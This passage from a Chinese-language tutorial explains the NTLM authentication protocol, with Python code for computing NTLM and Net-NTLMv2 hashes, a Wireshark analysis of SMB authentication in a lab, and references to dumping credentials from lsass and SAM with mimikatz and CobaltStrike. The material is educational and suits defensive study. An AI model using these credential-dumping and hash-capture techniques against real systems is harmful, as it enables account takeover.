builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input a string: "</span><span class="token punctuation">)</span>    HEX <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    cprint<span class="token punctuation">.</span>err<span class="token punctuation">(</span><span class="token string">"HEX编码:"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>    Unicode <span class="token operator">=</span> hex_to_unicode<span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>    cprint<span class="token punctuation">.</span>err<span class="token punctuation">(</span><span class="token string">"ASCII转Unicode编码"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>Unicode<span class="token punctuation">)</span>    NTLm_Hash <span class="token operator">=</span> unicode_to_md4<span class="token punctuation">(</span>Unicode<span class="token punctuation">)</span>    cprint<span class="token punctuation">.</span>err<span class="token punctuation">(</span><span class="token string">"对Unicode编码的16进制字符串进行标准MD4单向哈希加密"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>NTLm_Hash<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码运行效果如图1-4所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1667833252073-57af425e-6248-49cc-9dbc-2f3041fa161d.png" alt="img"></p><p>又或者直接一条python命令即可，如下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import hashlib,binascii; print("NTLM_Hash:"+binascii.hexlify(hashlib.new("md4", "P@ss1234".encode("utf-16le")).digest()).decode("utf-8"))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图1-5所示，直接一条Python命令进行NTLM Hash加密：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1651226010745-fbe9a6d0-256d-459b-8298-382f27bc38d8.png" alt="img"></p><h2 id="2-Windows系统存储的NTLM-Hash"><a href="#2-Windows系统存储的NTLM-Hash" class="headerlink" title="2. Windows系统存储的NTLM Hash"></a>2. Windows系统存储的NTLM Hash</h2><p>用户的密码经过NTLM Hash加密后存储在 %SystemRoot%\system32\config\SAM 文件里，如图1-6所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644319079234-97ef24ae-b84c-4cd7-a230-60347972ce28.png" alt="img"></p><p>当用户输入密码进行本地认证的过程中，所有的操作都是在本地进行的。系统将用户输入的密码转换为NTLM Hash，然后与SAM文件中的NTLM Hash进行比较，相同说明密码正确，反之错误。当用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登录界面，也就是输入框。当winlogon.exe接收输入后，将密码交给lsass.exe进程，lsass.exe进程中会存一份明文密码，将明文密码加密成NTLM Hash，与SAM数据库进行比较认证。我们使用mimikatz就是从lsass.exe进程中抓取明文密码或者密码哈希。使用mimikatz抓取lsass内存中的凭据如图1-7所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620912058983-f1ee7258-b939-4695-807c-1b4271613f25.png" alt="img"></p><p>使用MSF或者CobaltStrike通过转储哈希抓到的密码格式如下，第一部分是用户名，第二部分是用户的SID值，第三部分是LM Hash，第四部分是NTLM Hash，其余部分为空。</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">用户名:用户SID值:LM Hash:NTLM Hash:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从Windows Vista和Windows Server 2008开始，由于默认禁用了LM Hash，因此第三部分的LM Hash固定为空值，第四部分的NTLM-Hash才是用户密码加密后的凭据。</p><p>使用CobaltStrike的转储哈希功能转储目标机器内存中的凭据如图1-8所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620912015125-ac4e6c9a-f5d9-4452-9281-6367026c8941.png" alt="img"></p><h1 id="NTLM协议认证"><a href="#NTLM协议认证" class="headerlink" title="NTLM协议认证"></a>NTLM协议认证</h1><p>NTLM身份认证协议是一种基于 Challenge&#x2F;Response 质询响应验证机制，由三种类型消息组成：</p><ul><li>type 1(协商，Negotiate)；</li><li>type 2(质询，Challenge)；</li><li>type 3(认证，Auth)。</li></ul><p>NTLM身份认证协议有NTLM v1和NTLM v2两个版本，目前使用最多的是NTLM v2版本。NTLM v1与NTLM v2最显著的区别就是Challenge质询值与加密算法不同，共同之处就是都是使用的NTLM Hash进行加密。</p><h2 id="1-工作组环境下的NTLM认证"><a href="#1-工作组环境下的NTLM认证" class="headerlink" title="1. 工作组环境下的NTLM认证"></a>1. 工作组环境下的NTLM认证</h2><p>工作组环境下的NTLM 认证流程图如图1-9所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644849728940-d068298b-9a48-40c3-a786-033760482424.png" alt="img"></p><p>工作组环境下NTLM认证流程可以分为如下4步。</p><p>①：当客户端需要访问服务器的某个服务时，就需要进行身份认证。于是，当客户端输入服务器的用户名和密码进行验证的时候，客户端就会缓存服务器密码的NTLM Hash值。然后，客户端会向服务端发送一个请求，该请求利用NTLM SSP 生成NTLMSSP_NEGOTIATE消息（被称为<strong>Type 1 NEGOTIATE 协商消息</strong>）。</p><p>②：服务端接收到客户端发送过来的Type 1消息后，会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等。然后传入NTLM SSP，得到NTLMSSP_CHALLENGE 消息（被称为<strong>Type 2 Challenge 质询消息</strong>），并将此Type 2消息发回给客户端。此Type 2消息中包含了一个由服务端生成的16位随机值，此随机值被称为Challenge质询值，服务端会将该Challenge质询值缓存起来。</p><p>③：客户端收到服务端返回的Type 2消息后，读取出服务端所支持的内容，并取出其中的Challenge质询值，用缓存的服务器密码的NTLM Hash对其进行加密得到 Response消息。最后将Response和一些其他信息封装到NTLMSSP_AUTH认证消息中(被称为<strong>Type 3 Authenticate认证消息</strong>)，发往服务端。</p><p>④：服务端在收到Authenticate认证消息后，从中取出Net-NTLM Hash。然后用自己密码的NTLM Hash 对Challenge质询值进行一系列加密运算，得到自己计算的Net-NTLM Hash。并比较自己计算出的Net-NTLM Hash 和客户端发送的Net-NTLM Hash是否相等。如果相等，则证明客户端输入的密码正确，从而认证成功，反之则认证失败。</p><p>以上就是工作组环境下NTLM认证的流程。下面我们来使用WireShark对NTLM认证流程进行抓包查看：</p><h3 id="1-工作组环境下NTLM认证抓包"><a href="#1-工作组环境下NTLM认证抓包" class="headerlink" title="(1) 工作组环境下NTLM认证抓包"></a>(1) 工作组环境下NTLM认证抓包</h3><p>由于NTLM只是底层的认证协议，其必须镶嵌在上层应用协议里面，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP等。如下实验是基于SMB服务利用NTLM进行验证。</p><p>实验环境如下:</p><ul><li>客户端(WIN7)：10.211.55.6；</li><li>服务端(6C85)：10.211.55.7。</li></ul><p>工作组环境下NTLM认证拓扑图如图1-10所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644320488164-d5c8b351-2481-4dd5-8516-9fcbc00fed5d.png" alt="img"></p><p>使用正确的账号密码通过SMB协议认证10.211.55.7，可以看到认证成功，如图1-11所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620914060434-8b6f7285-5c31-4428-bb3c-26ed6cf74afd.png" alt="img"></p><p>在认证的过程中，使用WireShark进行抓包。如图1-12所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621302368896-775e128e-faa1-48ed-911f-873610f0fb87.png" alt="img"></p><p>如图1-13所示，使用错误的账号密码通过SMB协议认证10.211.55.7，可以看到认证失败。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620914067826-e79146bc-0286-4b01-85e5-58905538c06f.png" alt="img"></p><p>在认证的过程中，使用WireShark进行抓包。如图1-14所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621302380327-17e22883-d523-4a10-9688-d6ac7654ef1f.png" alt="img"></p><p>我们打开每个认证包发现，NTLM认证的数据包都是放在GSS-API里面的，如图1-15可以看到在SMB认证包里面的GSS-API：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620985758450-032f1048-1291-4017-bfc4-eb3311509716.png" alt="img"></p><p>那么什么是GSS-API呢？</p><p>GSS-API(Generic Security Service Application Program Interface，通用安全服务应用程序接口)，是一种统一的模式，为使用者提供与机制无关，平台无关，程序语言环境无关，并且可移植的安全服务。程序员在编写应用程序时，可以应用通用的安全机制，因此开发者不必针对任何特定的平台、安全机制、保护类型或传输协议来定制安全实现。SSPI是GSS-API的一个专有变体，进行了扩展并具有许多特定于Windows的数据类型。SSPI生成和接受的令牌大多与GSS-API兼容。而这里NTLM SSP实现了SSPI，因此也相当于实现了GSS-API。并且注册为SSP的一个好处就是，SSP实现了与安全有关的功能函数，因此上层协议(比如SMB、HTTP、LDAP)在进行身份认证等功能的时候，就可以不用考虑协议细节，只需要调用相关的函数即可。而认证过程中的流量嵌入在上层协议里面，不像Kerbreos，既可以镶嵌在上层协议里面，也可以作为独立的应用层协议。</p><p>下面我们来具体分析下WireShark抓包的内容：</p><h4 id="1）协商。"><a href="#1）协商。" class="headerlink" title="1）协商。"></a>1）协商。</h4><p>我们先来看一下前面四个包，如图1-16所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1637156834297-dfc58cb2-a302-463c-a422-9ff77f550e99.png" alt="img"></p><p>前面四个包是SMB协议协商的一些信息，这里着重讲一下Security mode安全模式。</p><p>如图1-17所示，可以看到Security mode下的Signing enabled为True，而Signing required为False，表明当前客户端虽然支持签名，但是协商不签名！</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1637156898702-09e31f01-94c5-41ac-bce8-3cff37b1bc0b.png" alt="img"></p><p>注：工作组环境下默认均不签名</p><h4 id="2）Negotiate协商数据包。"><a href="#2）Negotiate协商数据包。" class="headerlink" title="2）Negotiate协商数据包。"></a>2）Negotiate协商数据包。</h4><p>我们再来看看第五个包，如图1-18所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644321437271-bb7b0993-90a5-4455-adf4-5564834c0516.png" alt="img"></p><p>第五个包是NTLM的Negotiate协商包，也就是Type 1，是从客户端发送到服务器以启动NTLM身份验证的包。其主要目的是通过flag指示支持的选项来验证基本规则，并且可选的，它还可以向服务器提供客户端的工作站名称和客户端工作站具有成员身份的域；服务器使用此信息来确定客户端是否有资格进行本地身份验证。</p><p>Type 1消息主要包含如图1-19所示结构。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621740937908-666bf6fa-ecfe-46a0-b1cd-a4679a73dabc.png" alt="img"></p><p>Type 1 Negotiate协商包的核心部分如图1-20所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621740981659-eda99d3c-8403-4f8b-afb9-9e329c2562b2.png" alt="img"></p><p>其中Negotiate Flags字段需要协商的flag标志如图1-21所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620985701002-b7256d91-7779-4b0b-bb44-b2952e156e4c.png" alt="img"></p><h4 id="3）Challenge质询包。"><a href="#3）Challenge质询包。" class="headerlink" title="3）Challenge质询包。"></a>3）Challenge质询包。</h4><p>我们再来看看第六个包，如图1-22所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644321727275-421c0442-47f3-4998-b773-83bbca3cb7d9.png" alt="img"></p><p>第六个包是Type 2 Challenge质询消息，是服务端发送给客户端的，包含服务器支持和同意的功能列表。</p><p>Type 2消息主要包含如图1-23所示结构。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621741178500-f7ae2502-a998-4279-9e26-eee2f4bcf9f9.png" alt="img"></p><p>Type 2 Challenge质询消息的核心部分如图1-24所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621741097898-1143be4b-a176-4147-8882-590b7df88feb.png" alt="img"></p><p>Type2中消息中包含Challenge质询值，在NTLM v2版本中，Challenge质询值是一个随机的16字节的字符串。如图1-25所示，Challenge质询值为：f9e7d1fe37e7ae12。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620914158993-cd54662b-c986-41ae-9d49-8c10cc4f185b.png" alt="img"></p><h4 id="4）Authenticate认证包。"><a href="#4）Authenticate认证包。" class="headerlink" title="4）Authenticate认证包。"></a>4）Authenticate认证包。</h4><p>我们再来看看第七个包，如图1-26所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644322007109-ea001c2a-3716-4fca-84e8-4875daad9455.png" alt="img"></p><p>第七个包是Auth 认证消息，是客户端发给服务端的认证消息。此消息包含客户端对Type 2质询消息的响应，这表明客户端知道帐户密码。Auth消息还指示身份验证帐户的身份验证目标（域或服务器名）和用户名，以及客户端工作站名。</p><p>Auth认证消息主要包含如图1-27所示结构：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621741407456-2deb16df-1d47-4d7f-81f3-3b418c9d68fb.png" alt="img"></p><p>如图1-28所示，是Auth认证消息的核心部分：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621741445715-3e2e633e-0252-4155-9f49-139ae6065354.png" alt="img"></p><p>Auth认证消息中最主要的便是Type 3 Response响应消息。Response响应消息是用服务器密码的NTLM Hash加密Challenge质询值后经过一系列运算得到的，Response响应消息中可以提取出Net-NTLM Hash。在Type 3 Response响应消息中有六种类型的响应：</p><ul><li>LM响应：由低版本的客户端发送，这是“原始”响应类型。</li><li>NTLM v1响应：这是由基于NT的客户端发送的，包括Windows 2000和XP。</li><li>NTLM v2响应： 在Windows NT Service Pack 4中引入的一种较新的响应类型。它替换启用了 NTLMv2的系统上的NTLM响应。</li><li>LMv2响应：替换NTLMv2系统上的LM响应。</li><li>NTLMv2会话响应：用于在没有NTLMv2身份验证的情况下协商NTLMv2会话安全性时，此方案会更改LM NTLM响应的语义。</li><li>匿名响应：当匿名上下文正在建立时使用; 没有提供实际的证书，也没有真正的身份验证。“存根”字段显示在类型3消息中。</li></ul><p>这6种响应使用的加密流程一样，都是前面我们说的Challenge&#x2F;Response 质询响应验证机制，不同之处在于Challenge质询值和加密算法不同。至于选择哪个版本的响应由LmCompatibilityLevel决定，至于LmCompatibilityLevel，我们会在后面讲到。</p><p>如图1-29所示，可以看到在Type 3 Response响应消息中是NTLM v2响应类型：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621002407199-aaca3803-a4c9-4937-b4ea-6fb6207e71e7.png" alt="img"></p><p>如图1-30所示，可以看到在NTLMv2 Response响应消息下的NTProofStr字段，该字段的值是用做数据签名的Hash(HMAC-MD5)值，目的是保证数据的完整性。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621653291440-a46ce2d7-83bc-406f-b662-fbfd4028e4a4.png" alt="img"></p><p>而对于NTLMv2 Hash和NTProofStr，有如下计算公式。</p><ul><li><strong>NTLMv2 Hash</strong> &#x3D; HMAC-MD5(unicode(hex((upper(UserName)+DomainName))), NTLM Hash)</li><li><strong>NTProofStr</strong> &#x3D; HMAC-MD5(challenge + blob, NTLMv2 Hash)</li></ul><p>如图1-31所示，可以看到在NTLMv2 Response响应消息下的MIC字段。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621653325006-38dca1f0-f1e6-4872-a011-35d709cac5b8.png" alt="img"></p><p>微软为了防止数据包中途被篡改，使用exportedSessionKey加密三个NTLM消息，来保证数据包的完整性。而该exportedSessionKey仅对启动认证的帐户和目标服务器是已知的。因此有了MIC，攻击者就无法中途修改NTLM认证数据包了。对于MIC，有如下计算公式：</p><ul><li><strong>MIC</strong> &#x3D; HMAC_MD5(exportedSessionKey, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE)</li></ul><h4 id="5）返回成功与否。"><a href="#5）返回成功与否。" class="headerlink" title="5）返回成功与否。"></a>5）返回成功与否。</h4><p>第八个数据包就是返回结果，成功或者失败。</p><p>如图1-32所示是返回成功的数据包。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621520418151-b5b4d288-28fc-45ee-a10c-2ec67fa548e0.png" alt="img"></p><p>如图1-33所示是返回失败的数据包。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621520352576-ade866eb-0370-4faa-81c3-0523799c16fa.png" alt="img"></p><h4 id="6）签名。"><a href="#6）签名。" class="headerlink" title="6）签名。"></a>6）签名。</h4><p>在认证完成后，根据协商的字段值来确定是否需要对后续数据包进行签名。那么如果需要签名的话，是如何进行签名呢？</p><p>如图1-34所示，我们可以看到在第七个数据包中的Session Key字段。Session Key是用来进行协商加密密钥的。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621653376151-735d41e4-15c9-4481-b856-f50adde3a171.png" alt="img"></p><p>那么Session Key是如何生成的，以及是如何作用的呢？</p><p>我们接下来以impacket里面的函数来说明：</p><p>如图1-35所示，Session Key是由keyExchangeKey和exportedSessionKey经过一系列运算得到。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621664844796-b20221ca-e691-48ad-aea1-f769d2babb12.png" alt="img"></p><p>而keyExchangeKey是使用用户password和serverChallenge等值经过一定运算得到。如图1-36所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1622122049336-960f59cb-870b-46d5-b82a-7e23a6c2824f.png" alt="img"></p><p>而exportedSessionKey是客户端生成的随机数，用来加解密流量。如图1-37所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1622124431996-6a815098-1a7a-4079-bb6f-2a7700dce81b.png" alt="img"></p><p>那么，客户端和服务端是如何通过Session Key进行协商秘钥的呢？</p><p>首先，客户端会生成一个随机数exportedSessionKey，后续都是使用这个exportedSessionKey来加解密流量。由于exportedSessionKey是客户端生成的，服务端并不知道，那么是通过什么手段进行协商的呢？客户端使用keyExchangeKey做为Key，RC4加密算法加密exportedSessionKey，得到我们流量中看到的Session Key。服务端拿到流量后，使用用户密码和质询值Challenge经过运算生成keyExchangeKey，然后使用Session Key跟keyExchangeKey一起运算得到exportedSessionKey，然后使用exportedSessionKey进行加解密流量。对于攻击者来说，由于没有用户的密码，无法生成keyExchangeKey。因此，攻击者即使在拿到流量后，也无法计算出exportedSessionKey，自然也就无法解密流量了。</p><h3 id="2-Net-NTLM-v2-Hash计算"><a href="#2-Net-NTLM-v2-Hash计算" class="headerlink" title="(2) Net-NTLM v2 Hash计算"></a>(2) Net-NTLM v2 Hash计算</h3><p>我们来看看NTLM v2的Response消息是如何生成的，如下：</p><p>1）将大写User name与Domain name(区分大小写)拼在一起，进行Hex然后双字节Unicode编码得到data，接着使用16字节NTLM哈希作为密钥key，用data和key进行HMAC-MD5加密得到NTLMv2 Hash。</p><p>2）构建一个blob信息</p><p>3）使用16字节NTLMv2 Hash作为密钥，将HMAC-MD5消息认证代码算法加密一个值(来自type 2的Challenge与Blob拼接在一起)。得到一个16字节的NTProofStr(HMAC-MD5)。</p><p>4）将NTProofStr与Blob拼接起来形成得到Response。</p><p>以上就是NTLM v2版本Response消息的生成。我们平时在使用如Responder工具抓取NTLM Response消息的时候，都是抓取的Net-NTLM hash格式的数据。</p><p>Net-NTLM v2 hash的格式如下：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">username::domain:challenge:HMAC-MD5:blob<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中各部分含义如下：</p><ul><li>username（要访问服务器的用户名）：administrator</li><li>domain（域信息）：WIN7</li><li>challenge（数据包6中服务器返回的challenge值）：f9e7d1fe37e7ae12</li><li>HMAC-MD5（数据包7中的NTProofStr）: 202beed8c64468318318bad6e8ae8326</li><li>blob（blob对应数据为数据包7中NTLMv2 Response去掉NTProofStr的后半部分）：010100000000000000d248080d47d701684da093c89fd679000000000200080036004300380035000100080036004300380035000400080036004300380035000300080036004300380035000700080000d248080d47d70106000400020000000800300030000000000000000000000000300000ea8d4184d6934f5434f43abebde4a1b32162f75dbf6a799f74b049823a1522050a001000000000000000000000000000000000000900200063006900660073002f00310030002e003200310031002e00350035002e003700000000000000000000000000</li></ul><p>所以最后Net-NTLM v2 Hash值为如下：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">administrator::WIN7:f9e7d1fe37e7ae12:202beed8c64468318318bad6e8ae8326:010100000000000000d248080d47d701684da093c89fd679000000000200080036004300380035000100080036004300380035000400080036004300380035000300080036004300380035000700080000d248080d47d70106000400020000000800300030000000000000000000000000300000ea8d4184d6934f5434f43abebde4a1b32162f75dbf6a799f74b049823a1522050a001000000000000000000000000000000000000900200063006900660073002f00310030002e003200310031002e00350035002e003700000000000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从下面两个公式我们可以计算出NTLMv2 Hash、NTProofStr以及Reseonse。</p><ul><li><strong>NTLMv2 Hash</strong> &#x3D; HMAC-MD5(unicode(hex((upper(UserName)+DomainName))), NTLM Hash)</li><li><strong>NTProofStr</strong> &#x3D; HMAC-MD5(challenge + blob, NTLMv2 Hash)</li></ul><p>如下代码，通过输入相关值计算出NTLMv2 Hash、NTProofStr以及Reseonse值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> hmac<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> binascii<span class="token comment">#16进制编码</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> t <span class="token keyword">in</span> string<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#双字节Unicode编码</span><span class="token keyword">def</span> <span class="token function">hex_to_unicode</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> string<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"00"</span><span class="token comment">#NTLM hash计算</span><span class="token keyword">def</span> <span class="token function">Ntlm_hash</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"md4"</span><span class="token punctuation">,</span> string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-16le"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token comment">#hmac_md5加密</span><span class="token keyword">def</span> <span class="token function">hmac_md5</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Username: "</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Password: "</span><span class="token punctuation">)</span>    domain_name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Domain_name: "</span><span class="token punctuation">)</span>    challenge <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Challenge: "</span><span class="token punctuation">)</span>    blob <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input blob: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>    HEX <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>username<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>domain_name<span class="token punctuation">)</span>    data <span class="token operator">=</span> hex_to_unicode<span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>    <span class="token comment">#用户密码的NTLM Hash</span>    key <span class="token operator">=</span> Ntlm_hash<span class="token punctuation">(</span>password<span class="token punctuation">)</span>    <span class="token comment">#计算NTLM_v2_Hash</span>    NTLM_v2_Hash <span class="token operator">=</span> hmac_md5<span class="token punctuation">(</span>key<span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[0;31mNTLM_v2_Hash: \033[0m"</span><span class="token operator">+</span>NTLM_v2_Hash<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> challenge<span class="token operator">+</span>blob    NTProofStr <span class="token operator">=</span> hmac_md5<span class="token punctuation">(</span>NTLM_v2_Hash<span class="token punctuation">,</span>data2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[0;31mNTProofStr: \033[0m"</span><span class="token operator">+</span>NTProofStr<span class="token punctuation">)</span>    Response <span class="token operator">=</span> username <span class="token operator">+</span> <span class="token string">"::"</span><span class="token operator">+</span> domain_name <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> challenge <span class="token operator">+</span><span class="token string">":"</span> <span class="token operator">+</span> NTProofStr <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> blob    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[0;31mResponse: \033[0m"</span><span class="token operator">+</span>Response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码运行效果如图1-38所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1621751349464-fa47215d-89e6-4a45-af15-03949de0633e.png" alt="img"></p><h2 id="2-域环境下的NTLM认证"><a href="#2-域环境下的NTLM认证" class="headerlink" title="2. 域环境下的NTLM认证"></a>2. 域环境下的NTLM认证</h2><p>如图1-39所示，是域环境下的NTLM 认证流程图。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644849823367-4ce69583-5420-4890-9024-d20300ccb2a4.png" alt="img"></p><p>域环境下NTLM认证流程可以分为如下6步：</p><p>①：客户端想要访问服务器的某个服务，需要进行身份认证。于是，在客户端输入服务器的用户名和密码进行验证之后，客户端会缓存服务器密码的NTLM Hash值。然后，客户端会向服务端发送一个请求，该请求利用 NTLM SSP生成NTLMSSP_NEGOTIATE消息（被称为<strong>Type 1 NEGOTIATE 协商消息</strong>）</p><p>②：服务端接收到客户端发送过来的Type 1消息，会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等。然后传入 NTLM SSP，得到NTLMSSP_CHALLENGE 消息（被称为<strong>Type 2 Challenge 质询消息</strong>），并将此Type 2消息发回给客户端。此Type 2消息中包含了一个由服务端生成的16位随机值，此随机值被称为Challenge质询值，服务端将该Challenge值缓存起来。</p><p>③：客户端收到服务端返回的Type 